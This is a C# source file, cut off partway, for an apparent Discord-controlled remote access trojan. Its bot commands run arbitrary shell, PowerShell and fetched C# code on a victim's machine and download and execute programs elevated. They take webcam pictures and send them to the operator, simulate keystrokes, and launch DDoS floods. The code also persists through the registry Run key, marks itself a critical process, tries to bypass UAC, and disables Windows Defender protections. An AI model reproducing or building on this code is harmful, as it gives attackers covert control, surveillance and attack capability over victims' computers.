using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading.Tasks;
using AForge.Video.DirectShow;
using Discord.Commands;
using Discord;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
using Microsoft.CodeAnalysis;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using System.Windows.Forms;
using System.Security.AccessControl;

#pragma warning disable 1998
#pragma warning disable 0162
#pragma warning disable 4014
#pragma warning disable 0219
#pragma warning disable 8632

namespace RATK
{
    public class MyCommands : ModuleBase<SocketCommandContext>
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeConsole();

        public const int ScClose = 0xF060;

        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlSetProcessIsCritical(
            bool isCritical,
            IntPtr reserved,
            bool needScb
        );
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile
        );

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped
        );

        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        private const uint OpenExisting = 0x3;

        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        public static IMessage message;
        public static IMessage MBRConfirmationMessage;

        private static readonly HttpClient client = new HttpClient();

        [AttributeUsage(AttributeTargets.Method, AllowMultiple = false)]
        public class CommandDescriptionAttribute : Attribute
        {
            public string Description { get; }

            public CommandDescriptionAttribute(string description)
            {
                Description = description;
            }
        }
        [CommandDescription("Changes the prefix.")]
        [Command("prefix")]
        public async Task ChangePrefix(string prefix)
        {
            BotMain.CommandPrefix = prefix;
            await ReactNReply($":white_check_mark: `Prefix changed to: {prefix}`");
        }
        [CommandDescription("Displays all available machines.")]
        [Command("listmachines", Aliases = new string[] { "getmachines", "machines" })]
        public async Task GetMachines()
        {
            string uuid = "Unknown UUID";
            await Context.Message.ReplyAsync(
                $":wave: My name is {Environment.UserName} `IP: {BotMain.LocalIPAddress()})` and i'm alive. My command channel is: <#{BotMain.VictimCMDChannel.Id}>"
            );
        }
        [CommandDescription("[ip, port, timeout, protocol, selection, range1, range2, select]")]
        [Command("ddos")]
        public async Task DDOS(
            string ip,
            int port,
            int timeout,
            int protocol,
            int selection,
            int range1,
            int range2,
            int select
        )
        {
            string finalIp = null;
            int temp = 0;

            if (range1 > range2)
            {
                temp = range1;
                range1 = range2;
                range2 = temp;
            }

            switch (protocol)
            {
                case 1:
                    for (int p = 0; p < 10000000; p++)
                    {
                        if (select == 2)
                        {
                            Random random = new Random();
                            timeout = random.Next(range1, range2);
                        }

                        TcpClient tcp = new TcpClient();
                        try
                        {
                            tcp.ConnectAsync(ip, port).Wait(timeout);
                            if (tcp.Connected)
                            {
                                Console.WriteLine("DDOS attack {0}", ip);
                            }
                            else
                            {
                                Console.WriteLine("FAIL attack {0} Server DOWN", ip);
                            }
                            tcp.Close();
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("FAIL attack {0} Server DOWN", ip);
                            tcp.Close();
                        }
                    }
                    break;

                case 2:
                    finalIp = "http://" + ip;
                    for (int d = 0; d < 10000000; d++)
                    {
                        try
                        {
                            WebClient client = new WebClient();
                            client.DownloadStringAsync(new Uri(finalIp));
                            Console.WriteLine("DDOS attack {0}", finalIp);
                        }
                        catch
                        {
                            Console.WriteLine("FAIL attack {0} Server DOWN", finalIp);
                        }
                    }
                    break;

                case 4:
                    finalIp = "https://" + ip;
                    for (int d = 0; d < 10000000; d++)
                    {
                        try
                        {
                            WebClient client = new WebClient();
                            client.DownloadStringAsync(new Uri(finalIp));
                            Console.WriteLine("DDOS attack {0}", finalIp);
                        }
                        catch
                        {
                            Console.WriteLine("FAIL attack {0} Server DOWN", finalIp);
                        }
                    }
                    break;

                case 3:
                    IPAddress finalIpAddress = IPAddress.Parse(ip);
                    IPEndPoint endpoint = new IPEndPoint(finalIpAddress, port);
                    for (int u = 0; u < 10000000; u++)
                    {
                        if (select == 2)
                        {
                            Random random = new Random();
                            timeout = random.Next(range1, range2);
                        }

                        Socket sender = new Socket(
                            finalIpAddress.AddressFamily,
                            SocketType.Stream,
                            ProtocolType.Tcp
                        );
                        try
                        {
                            sender.ConnectAsync(endpoint).Wait(timeout);

                            byte[] message = Encoding.ASCII.GetBytes(
                                string.Concat(
                                    Enumerable.Repeat(
                                        "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
                                        50
                                    )
                                )
                            );
                            sender.Send(message);

                            sender.Close();
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("server down");
                        }
                    }
                    break;

                default:
                    await Context.Message.ReplyAsync(
                        "Invalid protocol!\nCommand usage: !ddos <url_or_ip> <port> <timeout> <protocol> <selection>  E.g: !ddos example.com 80 10000 3 1 1000 5000 "
                    );
                    break;
            }
        }
        [CommandDescription("Requests UAC permission as cmd.exe")]
        [Command("reqadmin")]
        public async Task RequestAdmin()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments =
                    "/c start \"\" \""
                    + System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName
                    + "\" runas",
                UseShellExecute = true,
                Verb = "runas"
            };

            var process = System.Diagnostics.Process.Start(startInfo);
            if (process != null)
            {
                process.WaitForExit();
                Environment.Exit(0);
            }
            else
            {
                await ReactNReply($":x: `User has denied the request.`");
            }
        }

        [CommandDescription("Try to bypass UAC.")]
        [Command("bypassuac")]
        public async Task TryToGetAdmin()
        {
            BotMain.TryBypassUAC();
        }
        [CommandDescription("Restarts the PC.")]
        [Command("restart", Aliases = new string[] { "reboot" })]
        public async Task RestartPC()
        {
            await ReactNReply("Restarting PC...");
            string appName = Settings.RegistryName;
            string appPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run",
                true
            );
            startupKey.SetValue(appName, appPath);
            ExitWindowsEx(
                ExitWindows.Reboot,
                ShutdownReason.MajorOther | ShutdownReason.MinorOther | ShutdownReason.FlagPlanned
            );
        }
        [CommandDescription("Shutdowns the pc.")]
        [Command("shutdown", Aliases = new string[] { "turnoff", "off" })]
        public async Task ShutdownPC()
        {
            await ReactNReply("Shutdowning PC...");
            string appName = Settings.RegistryName;
            string appPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run",
                true
            );
            startupKey.SetValue(appName, appPath);
            ExitWindowsEx(
                ExitWindows.ShutDown,
                ShutdownReason.MajorOther | ShutdownReason.MinorOther | ShutdownReason.FlagPlanned
            );
        }
        [CommandDescription("Logs off the user.")]
        [Command("logoff")]
        public async Task LogoffPC()
        {
            await ReactNReply("Logging off...");
            ExitWindowsEx(
                ExitWindows.LogOff,
                ShutdownReason.MajorOther | ShutdownReason.MinorOther | ShutdownReason.FlagPlanned
            );
        }
        [CommandDescription("Puts the program in the startup.")]
        [Command("startup")]
        public async Task StartupProgram()
        {
            string appName = Settings.RegistryName;
            string appPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run",
                true
            );
            startupKey.SetValue(appName, appPath);
        }
        [CommandDescription("Returns all console logs.")]
        [Command("clogs")]
        public async Task RetrieveConsoleLogs()
        {
            await ReplyAsync(
                $":white_check_mark: `Console Logs:`\n```\n{BotMain.StringWriter.ToString()}\n```"
            );
        }
        [CommandDescription("[DANGEROUS] Closes the program.")]
        [Command("exit")]
        public async Task Exit()
        {
            await ReplyAsync("bai :wave:");
            Environment.Exit(0);
        }
        [CommandDescription("Plays an WAV only audio.")]
        [Command("playaudio", Aliases = new string[] { "audio" })]
        public async Task PlayAudio(string url = "")
        {
            var attachment = Context.Message.Attachments.FirstOrDefault();
            string audioUrl = null;

            if (attachment != null)
            {
                audioUrl = attachment.Url;
            }
            else if (!string.IsNullOrEmpty(url))
            {
                audioUrl = url;
            }

            if (audioUrl == null)
            {
                await ReplyAsync(
                    ":x: `Could not get the attachment or link. Make sure it's a raw audio file and is valid.`"
                );
                return;
            }

            try
            {
                using (var client = new WebClient())
                {
                    var audioBytes = await client.DownloadDataTaskAsync(audioUrl);
                    using (var stream = new MemoryStream(audioBytes))
                    {
                        System.Media.SoundPlayer player = new System.Media.SoundPlayer(stream);
                        player.Play();
                    }
                }
            }
            catch (Exception ex)
            {
                await ReplyAsync($":x: `Error: {ex.Message}`");
            }
        }
        public async Task ReactNReply(string message, Emoji? emoji = null)
        {
            emoji ??= new Emoji("🟢");
            var sentMessage = await Context.Channel.SendMessageAsync(message);
            await sentMessage.AddReactionAsync(emoji);
        }

        [CommandDescription("Kills the specified process.")]
        [Command("killproc", Aliases = new string[] { "kill" })]
        public async Task KillProcess(string processName, bool TaskKill = false)
        {
            try
            {
                bool processKilled = false;

                if (TaskKill)
                {
                    var process = Process.Start($"cmd /c taskkill /f /im {processName}");
                    if (process != null)
                    {
                        processKilled = true;
                    }
                }
                else
                {
                    var processes = Process.GetProcessesByName(processName);
                    foreach (var proc in processes)
                    {
                        proc.Kill();
                        processKilled = true;
                    }
                }

                if (processKilled)
                {
                    await ReactNReply(
                        ":white_check_mark: `Process has been successfully killed!`",
                        Emoji.Parse(":green_circle:")
                    );
                }
                else
                {
                    await ReactNReply(
                        ":x: `No process found with the given name.`",
                        Emoji.Parse(":red_circle:")
                    );
                }
            }
            catch (Exception ex)
            {
                await ReactNReply(
                    $":x: `An error occurred: {ex.Message}`",
                    Emoji.Parse(":red_circle:")
                );
            }
        }
        static int ZGetMaxNameLength()
        {
            var processes = Process.GetProcesses();
            return processes.Max(p => p.ProcessName.Length);
        }

        static string ZBuildProcessList(int namePadding, int idPadding)
        {
            var sb = new StringBuilder();
            var processes = Process.GetProcesses().OrderBy(p => p.ProcessName).ToList();

            foreach (var process in processes)
            {
                try
                {
                    sb.AppendLine(
                        $"├── {process.ProcessName.PadRight(namePadding)}PID: {process.Id.ToString().PadRight(idPadding)}{process.StartTime:yyyy-MM-dd HH:mm:ss}"
                    );
                }
                catch (Exception)
                {
                    sb.AppendLine(
                        $"└── {process.ProcessName.PadRight(namePadding)}PID: {process.Id.ToString().PadRight(idPadding)}<Access Denied>"
                    );
                }
            }

            return sb.ToString();
        }

        static List<string> ZSplitMessage(string message, int maxLength)
        {
            var parts = new List<string>();
            while (message.Length > maxLength)
            {
                int splitIndex = message.LastIndexOf('\n', maxLength);
                if (splitIndex == -1)
                    splitIndex = maxLength;
                parts.Add(message.Substring(0, splitIndex));
                message = message.Substring(splitIndex).TrimStart('\n');
            }
            if (!string.IsNullOrEmpty(message))
                parts.Add(message);
            return parts;
        }

        [CommandDescription("Takes a cam picture.")]
        [Command("campic")]
        public async Task GetCampic()
        {
            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0)
            {
                await ReactNReply($":x: `No webcams found.`");
                return;
            }

            var videoCaptureDevice = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoCaptureDevice.NewFrame += async (sender, eventArgs) =>
            {
                var bitmap = eventArgs.Frame;
                Random r = new Random();
                string name = $"{r.Next(10000, 20000).ToString()}.png";
                var filePath = Path.Combine(Path.GetTempPath(), name);
                bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);

                using (var fileStream = new FileStream(filePath, FileMode.Open))
                {
                    var message = await BotMain.VictimCMDChannel.SendFileAsync(fileStream, name);
                }

                videoCaptureDevice.SignalToStop();
                videoCaptureDevice.WaitForStop();
            };

            videoCaptureDevice.Start();
        }
        [CommandDescription("Returns a list of all running processes.")]
        [Command("getprocs", Aliases = new string[] { "processes", "procs" })]
        public async Task ZGetProcesses()
        {
            var processes = Process.GetProcesses();
            int namePadding = ZGetMaxNameLength();
            int idPadding = processes.Max(p => p.Id.ToString().Length);

            var processList = ZBuildProcessList(namePadding, idPadding);

            foreach (var part in ZSplitMessage(processList, 1900))
            {
                await Context.Channel.SendMessageAsync(
                    $@"```
        {part}
```"
                );
            }
        }
        [CommandDescription("[TOGGLE] Makes the program critical.")]
        [Command("critical")]
        public async Task SetCriticalProcess()
        {
            try
            {
                if (!RuntimeSettings.IsCriticalProcess)
                {
                    Process.EnterDebugMode();
                    RtlSetProcessIsCritical(true, IntPtr.Zero, false);
                    await ReactNReply(
                        $":warning: `The process is now CRITICAL and killing it will result in BSOD.`",
                        Emoji.Parse(":yellow_circle:")
                    );

                }
                else
                {
                    RtlSetProcessIsCritical(false, IntPtr.Zero, false);
                    await ReactNReply(
                        $":white_check_mark: `The process is not critical anymore and user will be free to kill it.`"
                    );
                }
                RuntimeSettings.IsCriticalProcess = !RuntimeSettings.IsCriticalProcess;
            }
            catch (Exception ex)
            {
                await ReactNReply(
                    $":x: `An error occurred while trying to set process as critical: {ex.Message}`",
                    Emoji.Parse(":red_circle:")
                );
            }
        }
        [CommandDescription("Displays this message.")]
        [Command("help")]
        public async Task HelpMessage()
        {
            var type = typeof(MyCommands);
            var commands = new List<string>();

            foreach (var method in type.GetMethods())
            {
                var commandAttribute = method.GetCustomAttribute<CommandAttribute>();
                var descriptionAttribute = method.GetCustomAttribute<CommandDescriptionAttribute>();

                if (commandAttribute != null)
                {
                    var commandLine = commandAttribute.Text;
                    if (commandAttribute.Aliases != null && commandAttribute.Aliases.Any())
                    {
                        commandLine += "/" + string.Join("/", commandAttribute.Aliases);
                    }

                    if (descriptionAttribute != null)
                    {
                        commandLine += " - " + descriptionAttribute.Description;
                    }

                    commands.Add(commandLine);
                }
            }

            Random r = new Random();
            int BlackCock = r.Next(100000, 200000);
            File.WriteAllText(Path.GetTempPath()+$"\\{BlackCock}.txt", string.Join("\n", commands));

            await Context.Channel.SendFileAsync(Path.GetTempPath() + $"\\{BlackCock}.txt");
            File.Delete(Path.GetTempPath() + $"\\{BlackCock}.txt");
        }
        [CommandDescription("[ATTACHMENT/URL/CODEBLOCK] Executes a command in CMD.")]
        [Command("cmd", Aliases = new string[] { "shell" })]
        public async Task ExecuteCMD([Remainder] string input = null)
        {
            string command = input;

            if (Context.Message.Attachments.Count > 0)
            {
                using (var httpClient = new HttpClient())
                {
                    command = await httpClient.GetStringAsync(Context.Message.Attachments.First().Url);
                }
            }
            else if (Uri.IsWellFormedUriString(input, UriKind.Absolute))
            {
                using (var httpClient = new HttpClient())
                {
                    command = await httpClient.GetStringAsync(input);
                }
            }
            else if ((input.StartsWith("```") && input.EndsWith("```")) || (input.StartsWith("```cmd") && input.EndsWith("```")))
            {
                command = input.Substring(input.IndexOf('\n') + 1, input.Length - input.IndexOf('\n') - 4).Trim();
            }

            if (string.IsNullOrWhiteSpace(command))
            {
                await ReplyAsync(":x: `No command provided.`");
                return;
            }

            var processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = new Process { StartInfo = processInfo })
            {
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();

                if (!string.IsNullOrWhiteSpace(error))
                {
                    await ReplyAsync($":x: `Error:` ```{error}```");
                }
                else
                {
                    await ReplyAsync($":white_check_mark: `Output:` ```{output}```");
                }
            }
        }
        [CommandDescription("[ATTACHMENT/URL/CODEBLOCK] Executes a PowerShell script.")]
        [Command("ps")]
        public async Task ExecutePowerShell([Remainder] string script = null)
        {
            string psScript = script;

            if (Context.Message.Attachments.Count > 0)
            {
                using (var httpClient = new HttpClient())
                {
                    psScript = await httpClient.GetStringAsync(Context.Message.Attachments.First().Url);
                }
            }
            else if (Uri.IsWellFormedUriString(script, UriKind.Absolute))
            {
                using (var httpClient = new HttpClient())
                {
                    psScript = await httpClient.GetStringAsync(script);
                }
            }
            else if ((script.StartsWith("```") && script.EndsWith("```")) || (script.StartsWith("```ps") && script.EndsWith("```")))
            {
                psScript = script.Substring(script.IndexOf('\n') + 1, script.Length - script.IndexOf('\n') - 4).Trim();
            }

            if (string.IsNullOrWhiteSpace(psScript))
            {
                await ReplyAsync(":x: `No script provided.`");
                return;
            }

            var processInfo = new ProcessStartInfo("powershell.exe", "-STA -NoProfile -ExecutionPolicy Bypass -Command " + psScript)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = new Process { StartInfo = processInfo })
            {
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();

                if (!string.IsNullOrWhiteSpace(error))
                {
                    await ReplyAsync($":x: `Error:` ```{error}```");
                }
                else
                {
                    await ReplyAsync($":white_check_mark: `Output:` ```{output}```");
                }
            }
        }
        [CommandDescription("[ATTACHMENT/URL/CODEBLOCK] Executes C# code.")]
        [Command("csc")]
        public async Task ExecuteCSCode([Remainder] string code = null)
        {
            string fetchedCode = code;

            if (Context.Message.Attachments.Count > 0)
            {
                using (var httpClient = new HttpClient())
                {
                    fetchedCode = await httpClient.GetStringAsync(Context.Message.Attachments.First().Url);
                }
            }
            else if (Uri.IsWellFormedUriString(code, UriKind.Absolute))
            {
                using (var httpClient = new HttpClient())
                {
                    fetchedCode = await httpClient.GetStringAsync(code);
                }
            }
            else if ((code.StartsWith("```") && code.EndsWith("```")) || (code.StartsWith("```c#") && code.EndsWith("```")))
            {
                fetchedCode = code.Substring(code.IndexOf('\n') + 1, code.Length - code.IndexOf('\n') - 4).Trim();
            }

            if (string.IsNullOrWhiteSpace(fetchedCode))
            {
                await ReplyAsync(":x: `No code provided.`");
                return;
            }

            var syntaxTree = CSharpSyntaxTree.ParseText(fetchedCode);
            var references = AppDomain.CurrentDomain
                .GetAssemblies()
                .Where(assembly => !assembly.IsDynamic && !string.IsNullOrEmpty(assembly.Location))
                .Select(assembly => MetadataReference.CreateFromFile(assembly.Location))
                .ToArray();

            var compilation = CSharpCompilation
                .Create("DynamicAssembly")
                .WithOptions(new CSharpCompilationOptions(OutputKind.ConsoleApplication))
                .AddReferences(references)
                .AddSyntaxTrees(syntaxTree);

            using (var ms = new MemoryStream())
            {
                EmitResult result = compilation.Emit(ms);

                if (result.Success)
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    try
                    {
                        var assembly = Assembly.Load(ms.ToArray());
                        var entryPoint = assembly.EntryPoint;
                        if (entryPoint == null)
                        {
                            throw new Exception("No entry point (Main method) found in the provided code.");
                        }

                        var parameters = entryPoint.GetParameters().Length > 0 ? new object[] { new string[0] } : null;
                        entryPoint.Invoke(null, parameters);

                        await ReactNReply(":white_check_mark: `Code has been successfully executed.`");
                    }
                    catch (TargetInvocationException ex)
                    {
                        await ReactNReply($":x: `Error while executing the code: {ex.InnerException?.Message}`", Emoji.Parse(":red_circle:"));
                    }
                    catch (Exception ex)
                    {
                        await ReactNReply($":x: `An unexpected error occurred: {ex.Message}`", Emoji.Parse(":red_circle:"));
                    }
                }
                else
                {
                    string msg = string.Join("\n", result.Diagnostics.Select(d => $"{d.Severity}: {d.GetMessage()}"));
                    EConsole.ELog(msg, 3);
                    await ReactNReply($":x: `An error occurred while compiling CS code:`\n```{msg}```", Emoji.Parse(":red_circle:"));
                }
            }
        }

        [CommandDescription("Writes as keyboard (Use [KEY] to special keys).")]
        [Command("write")]
        public async Task WriteKB([Remainder] string input = "")
        {
            if (string.IsNullOrWhiteSpace(input))
            {
                await ReactNReply(
                    ":x: `Please specify the text to write. Example: !write hello [ENTER] world`"
                );
                return;
            }

            try
            {
                var pattern = @"\[([^\]]+)\]";
                var matches = System.Text.RegularExpressions.Regex.Matches(input, pattern);
                var processedInput = input;

                foreach (System.Text.RegularExpressions.Match match in matches)
                {
                    var command = match.Groups[1].Value.ToUpper();
                    switch (command)
                    {
                        case "ENTER":
                            SendKeys.SendWait("+{ENTER}");
                            break;
                        case "TAB":
                            SendKeys.SendWait("{TAB}");
                            break;
                        case "BACKSPACE":
                            SendKeys.SendWait("{BACKSPACE}");
                            break;
                        case "ESC":
                            SendKeys.SendWait("{ESCAPE}");
                            break;
                        case "DELETE":
                            SendKeys.SendWait("{DEL}");
                            break;
                        case "END":
                            SendKeys.SendWait("{END}");
                            break;
                        case "HOME":
                            SendKeys.SendWait("{HOME}");
                            break;
                        case "PGUP":
                            SendKeys.SendWait("{PGUP}");
                            break;
                        case "PGDN":
                            SendKeys.SendWait("{PGDN}");
                            break;
                        case "INS":
                            SendKeys.SendWait("{INSERT}");
                            break;
                        case "SCRLOCK":
                            SendKeys.SendWait("{SCROLLLOCK}");
                            break;
                        case "F1":
                            SendKeys.SendWait("{F1}");
                            break;
                        case "F2":
                            SendKeys.SendWait("{F2}");
                            break;
                        case "F3":
                            SendKeys.SendWait("{F3}");
                            break;
                        case "F4":
                            SendKeys.SendWait("{F4}");
                            break;
                        case "F5":
                            SendKeys.SendWait("{F5}");
                            break;
                        case "F6":
                            SendKeys.SendWait("{F6}");
                            break;
                        case "F7":
                            SendKeys.SendWait("{F7}");
                            break;
                        case "F8":
                            SendKeys.SendWait("{F8}");
                            break;
                        case "F9":
                            SendKeys.SendWait("{F9}");
                            break;
                        case "F10":
                            SendKeys.SendWait("{F10}");
                            break;
                        case "F11":
                            SendKeys.SendWait("{F11}");
                            break;
                        case "F12":
                            SendKeys.SendWait("{F12}");
                            break;
                        default:
                            await ReplyAsync($":x: `Unknown key command: [{command}]`");
                            return;
                    }
                    processedInput = processedInput.Replace(match.Value, "");
                }

                if (!string.IsNullOrWhiteSpace(processedInput.Trim()))
                {
                    SendKeys.SendWait(processedInput);
                }

                await ReactNReply($":white_check_mark: `Key(s) processed: {input}`");
            }
            catch (Exception ex)
            {
                await ReactNReply($":x: `An error occurred: {ex.Message}`", Emoji.Parse(":red_circle:"));
            }
        }

        [CommandDescription("[ATTACHMENT/URL] Executes the specified program.")]
        [Command("exe", Aliases = new string[] { "executable", "exec" })]
        public async Task DownloadFile(string url = "")
        {
            var attachment = Context.Message.Attachments.FirstOrDefault();
            WebClient wc = new WebClient();
            Random r = new Random();
            string tempPath = Path.GetTempPath();
            string filePath;

            if (attachment != null)
                filePath =
                    $"{tempPath}\\{r.Next(100000, 200000)}{Path.GetExtension(attachment.Filename)}";
            else if (!string.IsNullOrEmpty(url))
                filePath =
                    $"{tempPath}\\{r.Next(100000, 200000)}{Path.GetExtension(new Uri(url).AbsolutePath)}";
            else
                return;

            wc.DownloadFile(attachment != null ? attachment.Url : url, filePath);

            if (System.IO.File.Exists(filePath))
            {
                var processInfo = new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true,
                    Verb = "runas"
                };
                Process.Start(processInfo);
            }
        }
        [CommandDescription("Sets the current directory.")]
        [Command("setdir", Aliases = new string[] { "cd", "sd" })]
        public async Task SetDirectory([Remainder] string path = "")
        {
            string currentDirectory = Directory.GetCurrentDirectory();

            if (string.IsNullOrEmpty(path))
            {
                await ReactNReply(
                    $":white_check_mark: `Current directory: {Directory.GetCurrentDirectory()}`"
                );
                return;
            }

            if (path.Contains("<") || path.Contains(">"))
            {
                int depthChange = path.Count(c => c == '<') - path.Count(c => c == '>');
                for (int i = 0; i < Math.Abs(depthChange); i++)
                {
                    if (depthChange < 0)
                        currentDirectory = Path.Combine(currentDirectory, "sub");
                    else
                        currentDirectory =
                            Directory.GetParent(currentDirectory)?.FullName ?? currentDirectory;
                }
                Directory.SetCurrentDirectory(currentDirectory);
            }
            else if (Directory.Exists(path))
            {
                Directory.SetCurrentDirectory(path);
            }
            else
            {
                await ReactNReply(":x: `Invalid directory.`", Emoji.Parse(":yellow_circle:"));
                return;
            }

            await ReactNReply(
                $":white_check_mark: `Directory has been set to: {Directory.GetCurrentDirectory()}`"
            );
        }
        [CommandDescription("Opens the specified web url.")]
        [Command("site", Aliases = new string[] { "web", "url" })]
        public async Task StartURL([Remainder] string url)
        {
            Process.Start($"{url}");
            await ReactNReply($":white_check_mark: `URL {url} has started.`");
        }
        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(
                        regPath,
                        RegistryKeyPermissionCheck.ReadWriteSubTree
                    )
                )
                {
                    if (key == null)
                    {
                        Registry.LocalMachine
                            .CreateSubKey(regPath)
                            .SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
                else if (
                    line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine")
                    && line.EndsWith("False")
                )
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
                else if (
                    line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False")
                )
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection
                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting
                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting
                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow
                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat
                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat
                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        [CommandDescription("Disables windows defender.")]
        [Command("disabledefender")]
        public async Task BypassWindowsDefender()
        {
            if (!RuntimeSettings.IsAdministrator())
            {
                await ReactNReply($":x: `You need administrator permissions to use this command.`", Emoji.Parse(":red_circle:"));
                return;
            }
            try
            {
                InitiateDarkFender.ByPassTamper();
                InitiateDarkFender.DisableFender(true, true);

                if (Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features") != null)
                {
                    RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
                }

